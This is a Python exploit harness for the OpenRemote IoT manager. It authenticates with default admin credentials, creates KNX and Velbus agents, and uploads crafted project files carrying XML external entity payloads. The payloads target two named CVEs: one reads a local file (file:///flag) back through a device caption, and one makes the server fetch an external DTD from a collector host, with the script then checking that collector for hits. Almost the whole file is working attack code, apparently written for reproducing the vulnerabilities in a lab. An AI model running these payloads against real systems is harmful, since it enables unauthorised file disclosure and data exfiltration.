#!/usr/bin/env python3
"""HTTP harness for the real OpenRemote manager (official image).

Drives only the product's own endpoints:
  - keycloak password-grant via manager /auth reverse proxy
  - POST /api/master/asset (agent create)
  - POST /api/master/agent/assetImport/{agentId}

Payload templates are the benign OpenRemote test fixtures vendored under
poc/fixtures/ (VelbusProject.vlp and knx-import-testproject.knxproj).
Stdlib only.
"""
import json, base64, zipfile, io, re, os, urllib.request, urllib.error

_FIX = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")


def _read_fixture(name):
    path = os.path.join(_FIX, name)
    with open(path, "rb") as f:
        return f.read()


def get_token(base, user="admin", pw="secret"):
    data = ("grant_type=password&client_id=openremote&username=%s&password=%s" % (user, pw)).encode()
    req = urllib.request.Request(
        base + "/auth/realms/master/protocol/openid-connect/token",
        data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    return json.load(urllib.request.urlopen(req, timeout=60))["access_token"]


def _post_asset(base, token, body):
    req = urllib.request.Request(
        base + "/api/master/asset", data=json.dumps(body).encode(), method="POST",
        headers={"Authorization": "Bearer " + token, "Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(req, timeout=60))["id"]


def create_knx_agent(base, token, host="10.255.255.1"):
    """KNX agent. host need not be reachable: connect failures are caught and
    retried, so the protocol instance still registers."""
    body = {"name": "KNX import agent", "type": "KNXAgent", "realm": "master", "attributes": {
        "host": {"name": "host", "type": "text", "value": host},
        "port": {"name": "port", "type": "positiveInteger", "value": 3671},
        "routingMode": {"name": "routingMode", "type": "boolean", "value": False},
        "NATMode": {"name": "NATMode", "type": "boolean", "value": False},
        "messageSourceAddress": {"name": "messageSourceAddress", "type": "kNXMessageSourceAddress", "value": "0.0.0"},
        "agentDisabled": {"name": "agentDisabled", "type": "boolean", "value": False},
        "agentStatus": {"name": "agentStatus", "type": "connectionStatus", "value": "DISCONNECTED"},
        "notes": {"name": "notes", "type": "text", "value": "pcb"},
        "location": {"name": "location", "type": "GEO_JSONPoint", "value": {"type": "Point", "coordinates": [0, 0]}},
    }}
    return _post_asset(base, token, body)


def create_velbus_agent(base, token, host="collector", port=8000):
    """Velbus TCP agent. host:port MUST be a listening TCP endpoint (collector)
    or doStart throws and the import path never registers."""
    body = {"name": "Velbus import agent", "type": "VelbusTCPAgent", "realm": "master", "attributes": {
        "host": {"name": "host", "type": "text", "value": host},
        "port": {"name": "port", "type": "positiveInteger", "value": port},
        "timeInjectionInterval": {"name": "timeInjectionInterval", "type": "positiveInteger", "value": 3600},
        "agentDisabled": {"name": "agentDisabled", "type": "boolean", "value": False},
        "agentStatus": {"name": "agentStatus", "type": "connectionStatus", "value": "DISCONNECTED"},
        "notes": {"name": "notes", "type": "text", "value": "pcb"},
        "location": {"name": "location", "type": "GEO_JSONPoint", "value": {"type": "Point", "coordinates": [0, 0]}},
    }}
    return _post_asset(base, token, body)


def do_import(base, token, agent_id, file_bytes, name="p"):
    """POST /api/master/agent/assetImport/{agentId}. Returns (http_status, assets)."""
    body = json.dumps({"name": name, "contents": base64.b64encode(file_bytes).decode(), "binary": True}).encode()
    req = urllib.request.Request(
        base + "/api/master/agent/assetImport/" + agent_id, data=body, method="POST",
        headers={"Authorization": "Bearer " + token, "Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=240)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def build_velbus_payload(flag_uri="file:///flag"):
    """CVE-2026-40882: external general entity reflected via a Velbus <Caption>."""
    s = _read_fixture("VelbusProject.vlp").decode("utf-8-sig")
    doctype = '<!DOCTYPE Project [ <!ENTITY xxe SYSTEM "%s"> ]>\n' % flag_uri
    s = doctype + s
    s, n = re.subn(r"<Caption>VMB7IN</Caption>", "<Caption>PCBFLAG:&xxe;</Caption>", s, count=1)
    assert n == 1, "Velbus Caption anchor not found"
    return s.encode("utf-8")


def build_knx_oob_payload(dtd_url):
    """CVE-2026-54640: ETS 0.xml references an external DTD; Saxon resolves it."""
    raw = _read_fixture("knx-import-testproject.knxproj")
    with zipfile.ZipFile(io.BytesIO(raw)) as z:
        xml = z.read("P-039A/0.xml").decode("utf-8-sig")
    m = re.match(r"^(<\?xml[^>]*\?>)", xml)
    assert m, "no xml decl in 0.xml"
    xml = m.group(1) + ('\n<!DOCTYPE KNX SYSTEM "%s">' % dtd_url) + xml[m.end():]
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(raw)) as zin, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "P-039A/0.xml":
                data = xml.encode("utf-8")
            zout.writestr(item, data)
    return out.getvalue()


def collector_reset(collector_base):
    try:
        urllib.request.urlopen(collector_base + "/reset", timeout=30).read()
    except Exception:
        pass


def collector_hits(collector_base):
    try:
        return urllib.request.urlopen(collector_base + "/hits", timeout=30).read().decode(errors="replace")
    except Exception:
        return ""
